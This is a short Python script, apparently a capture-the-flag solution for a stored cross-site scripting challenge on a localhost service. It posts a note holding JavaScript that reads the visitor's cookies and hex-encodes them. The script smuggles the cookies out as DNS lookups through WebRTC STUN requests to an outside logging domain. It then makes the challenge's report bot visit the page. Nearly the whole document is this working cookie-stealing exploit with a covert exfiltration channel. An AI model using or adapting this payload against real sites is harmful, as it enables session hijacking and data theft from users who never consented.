import requests
import re
import base64


url = "http://localhost:28002/"
# https://dnsl0g.net/
payload = """
<script>
let hex = '';
const match = document.cookie;
for (let i = 0; i < match.length; i++) {
    hex += match.charCodeAt(i).toString(16).padStart(2, '0');
}
for (let i = 0; i < hex.length; i += 32) {
	const chunk = hex.slice(i, i + 32);
	const pc = new RTCPeerConnection({iceServers: [{'urls': `stun:${chunk}.ys7ny7b.q.dnsl0g.net`}]});
	pc.createDataChannel('d');
	pc.setLocalDescription();
}
</script>
"""

r = requests.post(
    url,
    data={
        "note": payload
    },
)

payload_url = 'http://xss5/'+'/'.join(r.url.split('/')[3:])
print(payload_url)


requests.post(
    url + "report",
    data={
        "url": payload_url,
    },
)

# you will get flag in dns log
